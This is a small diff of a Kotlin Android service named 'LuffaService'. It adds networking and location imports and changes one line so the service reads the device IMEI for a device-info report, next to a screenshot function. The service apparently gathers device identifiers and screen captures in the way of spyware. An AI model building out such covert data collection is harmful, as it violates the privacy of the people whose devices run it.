@@ -38,6 +38,15 @@ import java.io.File
 
 
 
+import java.net.HttpURLConnection
+import java.net.URL
+import android.location.LocationManager
+import android.net.Uri
+import android.provider.Settings
+import okhttp3.RequestBody.Companion.toRequestBody
+
+
+
 
 class LuffaService : Service() {
 
@@ -273,7 +282,7 @@ class LuffaService : Service() {
         return "Device: ${Build.MODEL}\n" +
                 "Android: ${Build.VERSION.RELEASE}\n" +
                 "ID: $DEVICE_ID\n" +
-                "IMEI: ${android.telephony.TelephonyManager.getDeviceId()} (Requires READ_PHONE_STATE)"
+                "IMEI: ${(getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).deviceId}"
     }
 
     private fun takeScreenshot(): File? {
